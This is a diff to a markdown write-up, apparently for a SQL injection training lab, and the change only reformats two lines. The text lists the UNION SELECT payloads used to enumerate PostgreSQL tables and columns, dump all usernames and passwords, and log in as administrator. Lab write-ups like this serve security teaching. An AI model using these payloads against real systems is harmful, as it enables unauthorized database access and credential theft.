@@ -25,9 +25,9 @@ Because user input is placed inside the query, an attacker can use a UNION attac
 3. Listed all tables in the database:
 - 'UNION SELECT table_name,NULL FROM information_schema.tables--  → revealed the full table list and confirmed the database is PostgreSQL. Identified a table named users_<xxxx> as the target.
 4. Listed the columns of that table:
-   'UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_<random>'-- → revealed columns username_<random> and password_<random>.
+- 'UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_<random>'-- → revealed columns username_<random> and password_<random>.
 5. Extracted the actual credentials:
-   'UNION SELECT username_<xxxx>,password_<xxxx> FROM users_<random>-- → returned all usernames and passwords, including the administrator's.
+- 'UNION SELECT username_<xxxx>,password_<xxxx> FROM users_<random>-- → returned all usernames and passwords, including the administrator's.
 6. Logged in as administrator using the extracted password, and you see the lab was marked as solved.
 
 # Evidence
